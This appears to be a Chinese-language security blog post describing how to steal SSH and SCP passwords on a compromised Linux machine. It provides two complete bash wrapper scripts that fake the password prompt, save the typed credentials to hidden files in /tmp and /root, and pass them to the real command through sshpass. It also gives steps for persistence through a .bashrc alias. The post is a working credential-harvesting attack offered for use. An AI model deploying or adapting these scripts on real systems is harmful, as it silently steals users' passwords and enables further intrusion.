---

layout: default

---



# Linux抓取SSH/SCP密码

## 0x01总体思路

​	大体思路是基于Linux的alias别名特性，通过创建ssh/scp的别名修改系统的ssh/scp命令指向自定义的恶意脚本，当用户在执行ssh/scp命令时实际执行的是指定的恶意脚本，脚本将中提示用户输入密码并保存本地，然后再调用系统中正常的ssh/scp命令完成用户指令。（抓密码思路源于klion知识星的分享）

## 0x02 SSH密码抓取

​	先给出脚本：

```shell
#!/bin/bash 
if [ $# != "1" ]		#判断是否只有一个参数 
then
	/usr/bin/ssh 
else
	echo -e "${1}'s password: \c" 
	read -s pass echo $1":"$pass >> /tmp/.log 
	echo "" 
	sshpass -p "$pass" /usr/bin/ssh ${1} 
fi
```

​	脚本中首先判断用户输入的参数是否为1个，其实此处还可以加多一层判断，看用户输入的是否是 `user@ip` 的格式，防止用户输入错误地参数脚本同样提示输入密码。根据用户的参数伪造ssh的回显，提示用户输入密码，并记录保存到本地/tmp/.log文件中。最后因为正常调用ssh命令时需要交互式输入密码，所以利用sshpass工具来将密码发送给ssh命令，从而正常执行ssh功能



## 0x03 SCP密码抓取

​	脚本：

```shell
#! /bin/bash
str="@"
for var in $*
do
        if [[ $var == *$str* ]];then
                arr=(${var//:/ })
                echo -e "${arr[0]}'s password: \c"
                read -s pass
                echo $pass >> /root/.log
                echo ""
        fi
done
sshpass -p "$pass" /usr/bin/scp ${*}
```

​	抓取scp密码原理与ssh的是一样的，只是脚本相对来说复杂一点点，因为scp的参数多且位置不固定，所以需要判断`user@ip`参数出现在第几个参数，然后根据该参数的内容来伪造正常的scp输入密码提示。

## 0x04 具体操作

1. 首先需要在目标机器上安装 `sshpass`工具，可以使用 `yum/apt-get`等包管理工具安装也可以下载源码编译安装。
2. 修改目标机器 alias , 比如 alias ssh=/root/.scp。可以在.bashrc文件中添加实现持久化抓取。
3. 将脚本放到指定的位置。

​	

